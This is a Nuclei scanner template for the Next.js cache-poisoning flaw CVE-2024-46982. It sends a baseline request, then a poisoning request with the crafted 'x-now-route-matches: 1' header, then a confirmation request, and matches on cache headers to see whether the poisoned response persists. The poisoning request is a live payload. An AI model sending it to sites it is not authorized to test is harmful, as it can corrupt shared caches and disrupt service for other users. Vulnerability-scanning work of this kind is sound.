id: cve-2024-46982-nextjs-pages-cache-poisoning
info:
  name: Next.js Pages SSR cache poisoning (CVE-2024-46982)
  author: BenraouaneSoufiane, chatgpt
  severity: high
  description: >
    Baseline → poison → confirm flow. Confirms persistence by comparing the poisoned response (#2)
    to a clean follow-up (#3) on the same cache key. Works on Vercel-style caches and generic CDNs.
  tags: cve,cache,poisoning,nextjs,ssr,vercel,web

variables:
  cb: "{{randstr}}"
  p: "/"

http:
  - raw:
      # 1) BASELINE (clean)
      - |
        GET {{p}}?nuclei_cb={{cb}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei/1.0
        Accept: */*
        Accept-Language: en
        Accept-Encoding: identity
        Connection: close

      # 2) POISON (with crafted header)
      - |
        GET {{p}}?nuclei_cb={{cb}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei/1.0
        Accept: */*
        Accept-Language: en
        Accept-Encoding: identity
        Connection: close
        x-now-route-matches: 1

      # 3) CONFIRM (clean again)
      - |
        GET {{p}}?nuclei_cb={{cb}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei/1.0
        Accept: */*
        Accept-Language: en
        Accept-Encoding: identity
        Connection: close

    redirects: true
    max-redirects: 2
    stop-at-first-match: true

    # We only require cache signals on #2/#3 and persistence between them.
    matchers-condition: or
    matchers:
      # --- Vercel/CDN style branch ---
      - type: dsl
        name: vercel-prod-cache-persistence
        condition: and
        dsl:
          - status_code_2 == 200
          - status_code_3 == 200
          # Pages Router SSR present (in any of #2/#3)
          - 'regex("\"(__N_SSP|gssp)\"\\s*:\\s*true", body_2) || regex("\"(__N_SSP|gssp)\"\\s*:\\s*true", body_3)'
          # Cache hints on #2 and #3
          - "(contains(to_lower(all_headers_2), 'x-nextjs-cache:') || contains(to_lower(all_headers_2), 's-maxage'))"
          - "(contains(to_lower(all_headers_3), 'x-nextjs-cache:') || contains(to_lower(all_headers_3), 's-maxage'))"
          # Persistence: #3 reuses #2
          - "( (etag2 != '' && contains(all_headers_3, etag2)) || (md5(body_2) == md5(body_3)) || (buildId2 != '' && contains(body_3, buildId2)) )"
          # Avoid cookie-keyed pages
          - "!contains(to_lower(all_headers_2), 'set-cookie:')"
          - "!contains(to_lower(all_headers_3), 'set-cookie:')"

      # --- Generic fallback (no Vercel headers) ---
      - type: dsl
        name: generic-cache-persistence
        condition: and
        dsl:
          - status_code_2 == 200
          - status_code_3 == 200
          - "!contains(to_lower(body_2), ' 404 ')"
          - "!contains(to_lower(body_3), ' 404 ')"
          - "( (etag2 != '' && contains(all_headers_3, etag2)) || (md5(body_2) == md5(body_3)) )"
          - "!contains(to_lower(all_headers_2), 'set-cookie:')"
          - "!contains(to_lower(all_headers_3), 'set-cookie:')"

    extractors:
      - type: regex
        name: etag2
        part: header_2
        internal: true
        regex:
          - (?mi)^etag:\s*([^\r\n]+)
      - type: regex
        name: buildId2
        part: body_2
        internal: true
        regex:
          - '"buildId"\s*:\s*"([A-Za-z0-9\-_]+)"'
